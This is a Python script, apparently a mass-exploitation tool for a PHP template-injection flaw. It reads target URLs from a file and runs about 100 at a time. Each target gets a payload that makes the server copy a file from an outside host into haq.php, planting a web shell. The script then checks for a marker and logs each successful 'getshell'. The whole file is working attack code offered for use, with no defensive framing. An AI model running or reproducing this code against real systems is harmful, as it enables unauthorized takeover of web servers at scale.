#@author:九世
#@time:2019/10/23
#@file:poc.py

import asyncio
import aiohttp
import optparse
import os
from colorama import init,Fore

init(wrap=True)

class Poc_scanner(object):
    def __init__(self):
        self.ybs=[]
        self.calc=0
        self.save=''
        self.headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'}
        self.payload='''/?a=fetch&templateFile=public/index&prefix=''&content=<php>echo copy("http://baidu.cdn.seobug.cn/1.txt","haq.php"); ?>')</php>'''
        self.guanjianzi='b0e5c2ccc713b954e99f339a19dfe205'

    async def exploit(self,url):
        urls='{}{}'.format(url,self.payload)
        yz_url='{}{}'.format(url,'haq.php')
        try:
            async with aiohttp.ClientSession() as request:
                async with request.get(url=urls,headers=self.headers,timeout=3,verify_ssl=False) as response:
                    pass

                async with request.get(url=yz_url,headers=self.headers,timeout=3,verify_ssl=False) as responses:
                    text=await responses.text(encoding='utf-8')
                    if self.guanjianzi in text:
                        print(Fore.GREEN+'[+] '+Fore.WHITE+'Getshell成功 URL:{}'.format(yz_url))
                        print('getshell成功:{}'.format(yz_url),file=open(self.save,'a',encoding='utf-8'))
                    else:
                        print(Fore.RED+'[-] '+Fore.WHITE+'Getshell失败 URL:{}'.format(url))
        except Exception as r:
            pass


    def mains(self):
        usage='python poc.py -f [file] -s [save_file]'
        parser=optparse.OptionParser(usage)
        parser.add_option('-f',dest='file',help='指定要测试的文件')
        parser.add_option('-s',dest='save_file',help='要保存的文件名')
        (option,args)=parser.parse_args()
        if option.file and option.save_file:
            self.save+=option.save_file
            self.start_scan(option.file)
        else:
            parser.print_help()
            exit()

    def start_scan(self,file):
        if os.path.exists(file):
            print(Fore.GREEN+'[+] '+Fore.WHITE+' 文件存在:{}'.format(file))
        else:
            print(Fore.RED+'[-] '+Fore.WHITE+'文件不存在:{}'.format(file))
            exit()

        dk=open(file,'r',encoding='utf-8')
        for rb in dk.readlines():
            data="".join(rb.split('\n'))
            if self.calc==100:
                loop=asyncio.get_event_loop()
                loop.run_until_complete(asyncio.wait(self.ybs))
                self.ybs.clear()
                self.calc=0

            self.ybs.append(asyncio.ensure_future(self.exploit(data)))
            self.calc+=1

        if len(self.ybs)>0:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(asyncio.wait(self.ybs))


if __name__ == '__main__':
    obj=Poc_scanner()
    obj.mains()